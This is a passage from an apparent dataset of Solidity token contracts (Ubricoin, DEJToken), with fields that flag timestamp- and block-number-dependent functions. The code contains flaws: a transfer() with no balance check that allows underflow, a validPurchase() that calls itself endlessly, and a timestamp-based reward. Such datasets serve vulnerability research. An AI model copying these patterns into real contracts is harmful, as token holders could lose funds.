  "content": "pragma solidity 0.4.24;\ncontract Ownable {\n address public owner=0x28970854Bfa61C0d6fE56Cc9daAAe5271CEaEC09;\n constructor()public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract PricingStrategy {\n function isPricingStrategy() public pure returns (bool) {\n return true;\n }\n function isSane() public pure returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public pure returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public pure returns (uint tokenAmount){\n }\n}\ncontract FinalizeAgent {\n function isFinalizeAgent() public pure returns(bool) {\n return true;\n }\n function isSane() public pure returns (bool){\n return true;\n}\n function finalizeCrowdsale() pure public{\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract UbricoinPresale {\n enum Phase {\n Created,\n Running,\n Paused,\n Migrating,\n Migrated\n }\n Phase public currentPhase = Phase.Created;\n uint public totalSupply = 0;\n address public tokenManager=0xAC762012330350DDd97Cc64B133536F8E32193a8;\n address public escrow=0x28970854Bfa61C0d6fE56Cc9daAAe5271CEaEC09;\n address public crowdsaleManager=0x9888375f4663891770DaaaF9286d97d44FeFC82E;\n mapping (address => uint256) private balance;\n modifier onlyTokenManager() { if(msg.sender != tokenManager) revert(); _; }\n modifier onlyCrowdsaleManager() { if(msg.sender != crowdsaleManager) revert(); _; }\n event LogBuy(address indexed owner, uint256 value);\n event LogBurn(address indexed owner, uint256 value);\n event LogPhaseSwitch(Phase newPhase);\n function burnTokens(address _owner) public\n onlyCrowdsaleManager\n {\n if(currentPhase != Phase.Migrating) revert();\n uint256 tokens = balance[_owner];\n if(tokens == 0) revert();\n balance[_owner] = 0;\n emit LogBurn(_owner, tokens);\n }\n function setPresalePhase(Phase _nextPhase) public\n onlyTokenManager\n {\n bool canSwitchPhase\n = (currentPhase == Phase.Created && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Running && _nextPhase == Phase.Paused)\n || ((currentPhase == Phase.Running || currentPhase == Phase.Paused)\n && _nextPhase == Phase.Migrating\n && crowdsaleManager != 0x0)\n || (currentPhase == Phase.Paused && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Migrating && _nextPhase == Phase.Migrated\n && totalSupply == 0);\n if(!canSwitchPhase) revert();\n currentPhase = _nextPhase;\n emit LogPhaseSwitch(_nextPhase);\n }\n function withdrawEther() public\n onlyTokenManager\n {\n if(address(this).balance > 0) {\n if(!escrow.send(address(this).balance)) revert();\n }\n }\n function setCrowdsaleManager(address _mgr) public\n onlyTokenManager\n {\n if(currentPhase == Phase.Migrating) revert();\n crowdsaleManager = _mgr;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) revert();\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) revert();\n _;\n }\n modifier onlyInEmergency {\n if (!halted) revert();\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract WhitelistedCrowdsale is Ownable {\n mapping(address => bool) public whitelist;\n modifier isWhitelisted(address _beneficiary) {\n require(whitelist[_beneficiary]);\n _;\n }\n function addToWhitelist(address _beneficiary) onlyOwner public {\n whitelist[_beneficiary] = true;\n }\n function addManyToWhitelist(address[] _beneficiaries) onlyOwner public {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromWhitelist(address _beneficiary)onlyOwner public {\n whitelist[_beneficiary] = false;\n }\n}\n contract UbricoinCrowdsale is FinalizeAgent,WhitelistedCrowdsale {\n using SafeMath for uint256;\n address public beneficiary=0x28970854Bfa61C0d6fE56Cc9daAAe5271CEaEC09;\n uint256 public fundingGoal;\n uint256 public amountRaised;\n uint256 public deadline;\n mapping(address => uint256) public balanceOf;\n bool fundingGoalReached = false;\n bool crowdsaleClosed = false;\n uint256 public investorCount = 0;\n bool public requiredSignedAddress;\n bool public requireCustomerId;\n bool public paused = false;\n event GoalReached(address recipient, uint256 totalAmountRaised);\n event FundTransfer(address backer, uint256 amount, bool isContribution);\n event Invested(address investor, uint256 weiAmount, uint256 tokenAmount, uint256 customerId);\n event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\n event Pause();\n event Unpause();\n modifier afterDeadline() { if (now >= deadline) _; }\n function invest(address ) public payable {\n if(requireCustomerId) revert();\n if(requiredSignedAddress) revert();\n }\n function investWithCustomerId(address , uint256 customerId) public payable {\n if(requiredSignedAddress) revert();\n if(customerId == 0)revert();\n }\n function buyWithCustomerId(uint256 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function checkGoalReached() afterDeadline public {\n if (amountRaised >= fundingGoal){\n fundingGoalReached = true;\n emit GoalReached(beneficiary, amountRaised);\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() afterDeadline public {\n if (!fundingGoalReached) {\n uint256 amount = balanceOf[msg.sender];\n balanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (msg.sender.send(amount)) {\n emit FundTransfer(beneficiary,amountRaised,false);\n } else {\n balanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n emit FundTransfer(beneficiary,amountRaised,false);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public returns (bool) {\n paused = true;\n emit Pause();\n return true;\n }\n function unpause() onlyOwner whenPaused public returns (bool) {\n paused = false;\n emit Unpause();\n return true;\n }\n}\ncontract Upgradeable {\n mapping(bytes4=>uint32) _sizes;\n address _dest;\n function initialize() public{\n }\n function replace(address target) internal {\n _dest = target;\n require(target.delegatecall(bytes4(keccak256(\"initialize()\"))));\n }\n}\ncontract Dispatcher is Upgradeable {\n constructor (address target) public {\n replace(target);\n }\n function initialize() public {\n revert();\n }\n function() public {\n uint len;\n address target;\n bytes4 sig;\n assembly { sig := calldataload(0) }\n len = _sizes[sig];\n target = _dest;\n bool ret;\n assembly {\n calldatacopy(0x0, 0x0, calldatasize)\n ret:=delegatecall(sub(gas, 10000), target, 0x0, calldatasize, 0, len)\n return(0, len)\n }\n if (!ret) revert();\n }\n}\ncontract Example is Upgradeable {\n uint _value;\n function initialize() public {\n _sizes[bytes4(keccak256(\"getUint()\"))] = 32;\n }\n function getUint() public view returns (uint) {\n return _value;\n }\n function setUint(uint value) public {\n _value = value;\n }\n}\ninterface tokenRecipient {\n function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData)external;\n}\ncontract Ubricoin is UbricoinPresale,Ownable,Haltable, UbricoinCrowdsale,Upgradeable {\n using SafeMath for uint256;\n string public name ='Ubricoin';\n string public symbol ='UBN';\n string public version= \"1.0\";\n uint public decimals=18;\n uint public totalSupply = 10000000000;\n uint256 public constant RATE = 1000;\n uint256 initialSupply;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n uint256 public AVAILABLE_AIRDROP_SUPPLY = 100000000;\n uint256 public grandTotalClaimed = 1;\n uint256 public startTime;\n struct Allocation {\n uint8 AllocationSupply;\n uint256 totalAllocated;\n uint256 amountClaimed;\n}\n mapping (address => Allocation) public allocations;\n mapping (address => bool) public airdropAdmins;\n mapping (address => bool) public airdrops;\n modifier onlyOwnerOrAdmin() {\n require(msg.sender == owner || airdropAdmins[msg.sender]);\n _;\n}\n event Burn(address indexed from, uint256 value);\n bytes32 public currentChallenge;\n uint256 public timeOfLastProof;\n uint256 public difficulty = 10**32;\n function proofOfWork(uint256 nonce) public{\n bytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\n require(n >= bytes8(difficulty));\n uint256 timeSinceLastProof = (now - timeOfLastProof);\n require(timeSinceLastProof >= 5 seconds);\n balanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\n difficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\n timeOfLastProof = now;\n currentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n }\n function () payable public whenNotPaused {\n require(msg.value > 0);\n uint256 tokens = msg.value.mul(RATE);\n balanceOf[msg.sender] = balanceOf[msg.sender].add(tokens);\n totalSupply = totalSupply.add(tokens);\n owner.transfer(msg.value);\n}\n function _transfer(address _from, address _to, uint256 _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value >= balanceOf[_to]);\n uint256 previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) public {\n balanceOf[msg.sender] -= _value;\n balanceOf[_to] += _value;\n }\n function balanceOf(address tokenOwner) public constant returns (uint256 balance) {\n return balanceOf[tokenOwner];\n}\n function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining) {\n return allowance[tokenOwner][spender];\n}\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public\n returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n public\n returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function burn(uint256 _value) public returns (bool success) {\n require(balanceOf[msg.sender] >= _value);\n balanceOf[msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(msg.sender, _value);\n return true;\n }\n function mintToken(address target, uint256 mintedAmount)private onlyOwner {\n balanceOf[target] += mintedAmount;\n totalSupply += mintedAmount;\n emit Transfer(0, owner, mintedAmount);\n emit Transfer(owner, target, mintedAmount);\n }\n function validPurchase() internal returns (bool) {\n bool lessThanMaxInvestment = msg.value <= 1000 ether;\n return validPurchase() && lessThanMaxInvestment;\n}\n function burnFrom(address _from, uint256 _value) public returns (bool success) {\n require(balanceOf[_from] >= _value);\n require(_value <= allowance[_from][msg.sender]);\n balanceOf[_from] -= _value;\n allowance[_from][msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(_from, _value);\n return true;\n }\n function setAirdropAdmin(address _admin, bool _isAdmin) public onlyOwner {\n airdropAdmins[_admin] = _isAdmin;\n }\n function airdropTokens(address[] _recipient) public onlyOwnerOrAdmin {\n uint airdropped;\n for(uint256 i = 0; i< _recipient.length; i++)\n {\n if (!airdrops[_recipient[i]]) {\n airdrops[_recipient[i]] = true;\n Ubricoin.transfer(_recipient[i], 1 * decimals);\n airdropped = airdropped.add(1 * decimals);\n }\n }\n AVAILABLE_AIRDROP_SUPPLY = AVAILABLE_AIRDROP_SUPPLY.sub(airdropped);\n totalSupply = totalSupply.sub(airdropped);\n grandTotalClaimed = grandTotalClaimed.add(airdropped);\n}\n}",
  "extract_feature": [
    "function proofOfWork(uint256 nonce) public{\nbytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\nrequire(n >= bytes8(difficulty));\nuint256 timeSinceLastProof = (now - timeOfLastProof);\nrequire(timeSinceLastProof >= 5 seconds);\nbalanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\ndifficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\ntimeOfLastProof = now;\ncurrentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b46"
  },
  "filename": "2355.sol",
  "content": "pragma solidity 0.4.24;\ncontract Ownable {\n address public owner=0x28970854Bfa61C0d6fE56Cc9daAAe5271CEaEC09;\n constructor()public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract PricingStrategy {\n function isPricingStrategy() public pure returns (bool) {\n return true;\n }\n function isSane() public pure returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public pure returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public pure returns (uint tokenAmount){\n }\n}\ncontract FinalizeAgent {\n function isFinalizeAgent() public pure returns(bool) {\n return true;\n }\n function isSane() public pure returns (bool){\n return true;\n}\n function finalizeCrowdsale() pure public{\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract UbricoinPresale {\n enum Phase {\n Created,\n Running,\n Paused,\n Migrating,\n Migrated\n }\n Phase public currentPhase = Phase.Created;\n uint public totalSupply = 0;\n address public tokenManager;\n address public escrow;\n address public crowdsaleManager;\n mapping (address => uint256) private balance;\n modifier onlyTokenManager() { if(msg.sender != tokenManager) revert(); _; }\n modifier onlyCrowdsaleManager() { if(msg.sender != crowdsaleManager) revert(); _; }\n event LogBuy(address indexed owner, uint256 value);\n event LogBurn(address indexed owner, uint256 value);\n event LogPhaseSwitch(Phase newPhase);\n function burnTokens(address _owner) public\n onlyCrowdsaleManager\n {\n if(currentPhase != Phase.Migrating) revert();\n uint256 tokens = balance[_owner];\n if(tokens == 0) revert();\n balance[_owner] = 0;\n emit LogBurn(_owner, tokens);\n }\n function setPresalePhase(Phase _nextPhase) public\n onlyTokenManager\n {\n bool canSwitchPhase\n = (currentPhase == Phase.Created && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Running && _nextPhase == Phase.Paused)\n || ((currentPhase == Phase.Running || currentPhase == Phase.Paused)\n && _nextPhase == Phase.Migrating\n && crowdsaleManager != 0x0)\n || (currentPhase == Phase.Paused && _nextPhase == Phase.Running)\n || (currentPhase == Phase.Migrating && _nextPhase == Phase.Migrated\n && totalSupply == 0);\n if(!canSwitchPhase) revert();\n currentPhase = _nextPhase;\n emit LogPhaseSwitch(_nextPhase);\n }\n function withdrawEther() public\n onlyTokenManager\n {\n if(address(this).balance > 0) {\n if(!escrow.send(address(this).balance)) revert();\n }\n }\n function setCrowdsaleManager(address _mgr) public\n onlyTokenManager\n {\n if(currentPhase == Phase.Migrating) revert();\n crowdsaleManager = _mgr;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) revert();\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) revert();\n _;\n }\n modifier onlyInEmergency {\n if (!halted) revert();\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract WhitelistedCrowdsale is Ownable {\n mapping(address => bool) public whitelist;\n modifier isWhitelisted(address _beneficiary) {\n require(whitelist[_beneficiary]);\n _;\n }\n function addToWhitelist(address _beneficiary) onlyOwner public {\n whitelist[_beneficiary] = true;\n }\n function addManyToWhitelist(address[] _beneficiaries) onlyOwner public {\n for (uint256 i = 0; i < _beneficiaries.length; i++) {\n whitelist[_beneficiaries[i]] = true;\n }\n }\n function removeFromWhitelist(address _beneficiary)onlyOwner public {\n whitelist[_beneficiary] = false;\n }\n}\n contract UbricoinCrowdsale is FinalizeAgent,WhitelistedCrowdsale {\n using SafeMath for uint256;\n address public beneficiary;\n uint256 public fundingGoal;\n uint256 public amountRaised;\n uint256 public deadline;\n mapping(address => uint256) public balanceOf;\n bool fundingGoalReached = false;\n bool crowdsaleClosed = false;\n uint256 public investorCount = 0;\n bool public requiredSignedAddress;\n bool public requireCustomerId;\n bool public paused = false;\n event GoalReached(address recipient, uint256 totalAmountRaised);\n event FundTransfer(address backer, uint256 amount, bool isContribution);\n event Invested(address investor, uint256 weiAmount, uint256 tokenAmount, uint256 customerId);\n event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\n event Pause();\n event Unpause();\n modifier afterDeadline() { if (now >= deadline) _; }\n function invest(address ) public payable {\n if(requireCustomerId) revert();\n if(requiredSignedAddress) revert();\n }\n function investWithCustomerId(address , uint256 customerId) public payable {\n if(requiredSignedAddress) revert();\n if(customerId == 0)revert();\n }\n function buyWithCustomerId(uint256 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function checkGoalReached() afterDeadline public {\n if (amountRaised >= fundingGoal){\n fundingGoalReached = true;\n emit GoalReached(beneficiary, amountRaised);\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() afterDeadline public {\n if (!fundingGoalReached) {\n uint256 amount = balanceOf[msg.sender];\n balanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (msg.sender.send(amount)) {\n emit FundTransfer(beneficiary,amountRaised,false);\n } else {\n balanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n emit FundTransfer(beneficiary,amountRaised,false);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public returns (bool) {\n paused = true;\n emit Pause();\n return true;\n }\n function unpause() onlyOwner whenPaused public returns (bool) {\n paused = false;\n emit Unpause();\n return true;\n }\n}\ncontract Upgradeable {\n mapping(bytes4=>uint32) _sizes;\n address _dest;\n function initialize() public{\n }\n function replace(address target) internal {\n _dest = target;\n require(target.delegatecall(bytes4(keccak256(\"initialize()\"))));\n }\n}\ncontract Dispatcher is Upgradeable {\n constructor (address target) public {\n replace(target);\n }\n function initialize() public {\n revert();\n }\n function() public {\n uint len;\n address target;\n bytes4 sig;\n assembly { sig := calldataload(0) }\n len = _sizes[sig];\n target = _dest;\n bool ret;\n assembly {\n calldatacopy(0x0, 0x0, calldatasize)\n ret:=delegatecall(sub(gas, 10000), target, 0x0, calldatasize, 0, len)\n return(0, len)\n }\n if (!ret) revert();\n }\n}\ncontract Example is Upgradeable {\n uint _value;\n function initialize() public {\n _sizes[bytes4(keccak256(\"getUint()\"))] = 32;\n }\n function getUint() public view returns (uint) {\n return _value;\n }\n function setUint(uint value) public {\n _value = value;\n }\n}\ninterface tokenRecipient {\n function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData)external;\n}\ncontract Ubricoin is UbricoinPresale,Ownable,Haltable, UbricoinCrowdsale,Upgradeable {\n using SafeMath for uint256;\n string public name ='Ubricoin';\n string public symbol ='UBN';\n string public version= \"1.0\";\n uint public decimals=18;\n uint public totalSupply = 10000000000;\n uint256 public constant RATE = 1000;\n uint256 initialSupply;\n mapping (address => uint256) public balanceOf;\n mapping (address => mapping (address => uint256)) public allowance;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n uint256 public AVAILABLE_AIRDROP_SUPPLY = 100000000* decimals;\n uint256 public grandTotalClaimed = 1;\n uint256 public startTime;\n struct Allocation {\n uint8 AllocationSupply;\n uint256 totalAllocated;\n uint256 amountClaimed;\n}\n mapping (address => Allocation) public allocations;\n mapping (address => bool) public airdropAdmins;\n mapping (address => bool) public airdrops;\n modifier onlyOwnerOrAdmin() {\n require(msg.sender == owner || airdropAdmins[msg.sender]);\n _;\n}\n event Burn(address indexed from, uint256 value);\n bytes32 public currentChallenge;\n uint256 public timeOfLastProof;\n uint256 public difficulty = 10**32;\n function proofOfWork(uint256 nonce) public{\n bytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\n require(n >= bytes8(difficulty));\n uint256 timeSinceLastProof = (now - timeOfLastProof);\n require(timeSinceLastProof >= 5 seconds);\n balanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\n difficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\n timeOfLastProof = now;\n currentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n }\n function () payable public whenNotPaused {\n require(msg.value > 0);\n uint256 tokens = msg.value.mul(RATE);\n balanceOf[msg.sender] = balanceOf[msg.sender].add(tokens);\n totalSupply = totalSupply.add(tokens);\n owner.transfer(msg.value);\n}\n function _transfer(address _from, address _to, uint256 _value) internal {\n require(_to != 0x0);\n require(balanceOf[_from] >= _value);\n require(balanceOf[_to] + _value >= balanceOf[_to]);\n uint256 previousBalances = balanceOf[_from] + balanceOf[_to];\n balanceOf[_from] -= _value;\n balanceOf[_to] += _value;\n emit Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) public {\n balanceOf[msg.sender] -= _value;\n balanceOf[_to] += _value;\n }\n function balanceOf(address tokenOwner) public constant returns (uint256 balance) {\n return balanceOf[tokenOwner];\n}\n function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining) {\n return allowance[tokenOwner][spender];\n}\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public\n returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n public\n returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function burn(uint256 _value) public returns (bool success) {\n require(balanceOf[msg.sender] >= _value);\n balanceOf[msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(msg.sender, _value);\n return true;\n }\n function mintToken(address target, uint256 mintedAmount)private onlyOwner {\n balanceOf[target] += mintedAmount;\n totalSupply += mintedAmount;\n emit Transfer(0, owner, mintedAmount);\n emit Transfer(owner, target, mintedAmount);\n }\n function validPurchase() internal returns (bool) {\n bool lessThanMaxInvestment = msg.value <= 1000 ether;\n return validPurchase() && lessThanMaxInvestment;\n}\n function burnFrom(address _from, uint256 _value) public returns (bool success) {\n require(balanceOf[_from] >= _value);\n require(_value <= allowance[_from][msg.sender]);\n balanceOf[_from] -= _value;\n allowance[_from][msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(_from, _value);\n return true;\n }\n function setAirdropAdmin(address _admin, bool _isAdmin) public onlyOwner {\n airdropAdmins[_admin] = _isAdmin;\n }\n function airdropTokens(address[] _recipient) public onlyOwnerOrAdmin {\n uint airdropped;\n for(uint256 i = 0; i< _recipient.length; i++)\n {\n if (!airdrops[_recipient[i]]) {\n airdrops[_recipient[i]] = true;\n Ubricoin.transfer(_recipient[i], 1 * decimals);\n airdropped = airdropped.add(1 * decimals);\n }\n }\n AVAILABLE_AIRDROP_SUPPLY = AVAILABLE_AIRDROP_SUPPLY.sub(airdropped);\n totalSupply = totalSupply.sub(airdropped);\n grandTotalClaimed = grandTotalClaimed.add(airdropped);\n}\n}",
  "extract_feature": [
    "function proofOfWork(uint256 nonce) public{\nbytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\nrequire(n >= bytes8(difficulty));\nuint256 timeSinceLastProof = (now - timeOfLastProof);\nrequire(timeSinceLastProof >= 5 seconds);\nbalanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\ndifficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\ntimeOfLastProof = now;\ncurrentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b47"
  },
  "filename": "238.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract DEJToken is StandardToken, SafeMath {\n string public constant name = \"De Home\";\n string public constant symbol = \"DEJ\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function DEJToken()\n {\n ethFundDeposit = 0x697e6C6845212AE294E55E0adB13977de0F0BD37;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(1000000000);\n totalSupply = formatDecimals(1000000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b48"
  },
  "filename": "2405.sol",
